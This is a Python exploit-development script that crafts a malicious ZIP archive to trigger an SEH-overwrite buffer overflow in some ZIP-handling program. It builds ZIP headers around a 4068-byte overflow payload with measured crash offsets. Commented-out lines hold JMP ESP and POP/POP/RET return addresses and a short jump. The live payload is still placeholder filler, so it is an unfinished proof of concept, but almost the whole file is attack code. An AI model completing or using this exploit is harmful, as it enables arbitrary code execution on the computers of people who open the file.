#!/usr/bin/env python
import struct
import sys

# Filename
file_name = "hodorlol.zip"

# Variables for headers
file_size = "\xe4\x0f"
dir_size = "\x12\x10\x00\x00"
offset_dir = "\x02\x10\x00\x00"

# Headers
ldf_header = (      "\x50\x4B\x03\x04\x14\x00\x00"
                    "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
                    "\x00\x00\x00\x00\x00\x00\x00\x00"
                     + file_size +
                    "\x00\x00\x00" )

cdf_header = (      "\x50\x4B\x01\x02\x14\x00\x14"
                    "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
                    "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    + file_size +
                    "\x00\x00\x00\x00\x00\x00\x01\x00"
                    "\x24\x00\x00\x00\x00\x00\x00\x00" )

eofcdf_header = (   "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
                     + dir_size + 
                     offset_dir +
                    "\x00\x00" )

# Lengths and offsets
maxlen = 4068

crash_ebp = 288
crash_esi = 1376
crash_nseh = 296
crash_seh = crash_nseh + 4

prefix = "A" * crash_nseh
nseh = "B" * 4
# nseh = struct.pack("<L", 0x0057614d) # JMP ESP
#seh = struct.pack("<L", 0x00401554) # POP/POP/RET
#seh = "\x90\x90\xeb\x06" 
seh = "C" * 4
suffix = "D" * (maxlen - len(prefix + nseh + seh))

# Construct payload
payload = prefix + nseh + seh + suffix

# Check if size matches
if len(payload) != 4068:
    print("[!] Warning, payload size isn't correct!")

# Craft final string to save as file
exploit = ldf_header + payload + cdf_header + payload + eofcdf_header

print("Size : {s}".format(s=len(payload)))
with open(file_name, 'w') as f:
    f.write(exploit)
